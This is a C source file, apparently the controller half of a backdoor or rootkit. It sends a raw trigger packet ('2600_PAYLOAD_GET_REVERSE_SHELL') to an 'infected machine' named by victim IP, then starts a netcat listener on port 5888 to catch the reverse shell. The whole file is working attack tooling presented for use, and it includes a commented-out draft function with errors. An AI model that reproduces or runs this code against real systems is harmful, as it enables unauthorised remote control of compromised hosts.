#include "companion.h"

// For printing with colors
#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"

void print_welcome_message(){
    printf("*******************************************************\n");
    printf("************* COUCOU c'est moi *************************\n");
    printf("*******************************************************\n");
    printf("********************************************************\n");
    printf("*******************************************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s OPTION victim_IP\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S";
    char* desc = "Get a remote shell to victim_IP";
    printf("\t%-40s %-50s\n\n", line, desc);

}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress() {
    char hostbuffer[256];
    struct addrinfo hints, *res, *p;
    int status;

    if (gethostname(hostbuffer, sizeof(hostbuffer)) == -1) {
        perror("Error getting local IP: gethostname");
        exit(1);
    }

    printf("Host Name: %s\n", hostbuffer);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; // Permet IPv4 ou IPv6
    hints.ai_socktype = SOCK_STREAM;

    // Ajout d'une pause de 1 seconde avant de rappeler getaddrinfo
    sleep(1);

    if ((status = getaddrinfo(hostbuffer, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "Error getting local IP: %s\n", gai_strerror(status));
        exit(1);
    }

    printf("List of IP Addresses:\n");
    char IPbuffer[INET6_ADDRSTRLEN];
    char* selectedIP = NULL;

    for (p = res; p != NULL; p = p->ai_next) {
        void *addr;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
        } else {
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
            addr = &(ipv6->sin6_addr);
        }

        // Convertir l'adresse en chaîne
        if (inet_ntop(p->ai_family, addr, IPbuffer, sizeof IPbuffer) == NULL) {
            perror("Error converting IP to string");
            exit(1);
        }

        printf("  - %s\n", IPbuffer);

        // Filtrer les adresses que vous ne voulez pas (127.0.0.1 et IPv6)
        if (strcmp(IPbuffer, "127.0.0.1") != 0 && strchr(IPbuffer, ':') == NULL) {
            printf("Selected IP: %s\n", IPbuffer);
            selectedIP = strdup(IPbuffer);
            break;
        }
    }

    freeaddrinfo(res); // Libérer la mémoire allouée par getaddrinfo

    if (selectedIP == NULL) {
        fprintf(stderr, "["KBLU"INFO"RESET"]""Attacker IP not selected. Could not find a suitable IP address\n");
        exit(1);
    }

    printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", selectedIP);

    return selectedIP;
}


// char* getLocalIpAddress(){
//     char hostbuffer[256];
//     char* IPbuffer = calloc(256, sizeof(char));
//     struct hostent *host_entry;
//     struct addrinfo hints, *res, *p;
//     int status;
//     int hostname;
  
//   //new after gethostbyname
//     hostname = gethostname(hostbuffer, sizeof(hostbuffer));
//     if(hostname==-1){
//         perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
//         exit(1);
//     }
//     printf("Host Name: %s\n", hostbuffer);
 
//     // host_entry = gethostbyname(hostbuffer);
//     // if(host_entry == NULL){
//     //     perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
//     //     exit(1);
//     // }

//     struct addrinfo hints, *res;
//     memset(&hints, 0, sizeof hints);
//     hints.ai_family = AF_UNSPEC;
//     hints.ai_socktype = SOCK_STREAM;

//     // Obtenir les informations d'adresse
//     if (getaddrinfo(hostbuffer, NULL, &hints, &res) != 0) {
//         perror("Error getting local IP: getaddrinfo");
//         exit(1);
//     }

//     char IPbuffer[INET6_ADDRSTRLEN];
//     for (p = res; p != NULL; p = p->ai_next) {
//         void *addr;
//         if (p->ai_family == AF_INET) {
//             struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
//             addr = &(ipv4->sin_addr);
//         } else {
//             struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
//             addr = &(ipv6->sin6_addr);
//         }

//         // Convertir l'adresse en chaîne
//         if (inet_ntop(p->ai_family, addr, IPbuffer, sizeof IPbuffer) == NULL) {
//             perror("Error converting IP to string");
//             exit(1);
//         }

//         printf("  - %s\n", IPbuffer);

//         // Filtrer les adresses que vous ne voulez pas (127.0.0.1 et IPv6)
//         if (strcmp(IPbuffer, "127.0.0.1") != 0 && strchr(IPbuffer, ':') == NULL) {
//             printf("Selected IP: %s\n", IPbuffer);
//             freeaddrinfo(res); // Libérer la mémoire allouée par getaddrinfo
//             return strdup(IPbuffer);
//         }
//     }
//     // To convert an Internet network
//     // address into ASCII string
//     //strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
//     printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
  
//     return IPbuffer;
// }

void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(2600, 2600, local_ip, argv, 2048, "2600_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);
        //Sending the malicious payload
        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {
        //Activating listener
        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "5888";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error executing background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}


void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
        print_help_dialog(argv[0]);
        return;
    }

    
    int opt;
    char dest_address[32];
    char path_arg[512];

    //Command line argument parsing
    while ((opt = getopt(argc, argv, ":S:u:i:p:e:d:h")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);
            //Get a shell mode
            printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");
            //printf("Option S has argument %s\n", optarg);
            strcpy(dest_address, optarg);
            get_shell(dest_address);
            
            break;
        }
    }
}  